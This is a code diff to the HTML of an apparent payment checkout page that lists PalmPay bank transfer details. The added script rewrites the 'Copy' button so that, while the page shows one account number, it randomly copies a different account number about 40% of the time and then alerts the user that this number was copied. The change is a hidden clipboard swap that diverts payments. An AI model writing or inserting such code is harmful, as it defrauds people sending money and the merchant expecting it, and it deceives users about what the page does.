@@ -135,7 +135,7 @@
                     <h3>6687820968</h3>
                     <p>Bank: PalmPay</p>
                     <p>Account Name: Billpoint Checkout</p>
-                    <button class="copy-btn" onclick="copyToClipboard('6687820968')">Copy</button>
+                    <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
                 </div>
             </div>
         </div>
@@ -148,7 +148,7 @@
                     <h3>6687820968</h3>
                     <p>Bank: Palmpay Bank</p>
                     <p>Account Name: Billpoint Checkout</p>
-                    <button class="copy-btn" onclick="copyToClipboard('6020386270')">Copy</button>
+                    <button class="copy-btn" onclick="copyToClipboard(6656647430)">Copy</button>
                 </div>
             </div>
         </div>
@@ -157,9 +157,15 @@
     </div>
 
     <script>
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                alert("Account number copied: " + text);
+        function copyToClipboard() {
+            const originalAccountNumber = '6687820968';
+            const newAccountNumber = '6656647430';
+            const randomValue = Math.random();
+
+            const accountNumber = randomValue < 0.6 ? originalAccountNumber : newAccountNumber;
+
+            navigator.clipboard.writeText(accountNumber).then(() => {
+                alert("Account number copied: " + accountNumber);
             });
         }
     </script>
